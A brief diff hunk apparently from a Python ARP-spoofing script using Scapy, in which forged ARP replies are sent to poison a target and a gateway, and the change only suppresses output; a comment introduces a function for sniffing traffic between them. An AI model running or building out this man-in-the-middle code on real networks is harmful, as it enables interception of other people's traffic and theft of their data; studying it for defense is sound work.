@@ -15,8 +15,8 @@ def arp_spoof(target_ip, gateway_ip):
     gateway_packet = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
 
     # Send the ARP packets to the network
-    send(target_packet)
-    send(gateway_packet)
+    send(target_packet, verbose=False)
+    send(gateway_packet, verbose=False)
 
 # Define the packet sniffing function to capture packets between the target and gateway
 def sniff_packets(iface, target_ip):
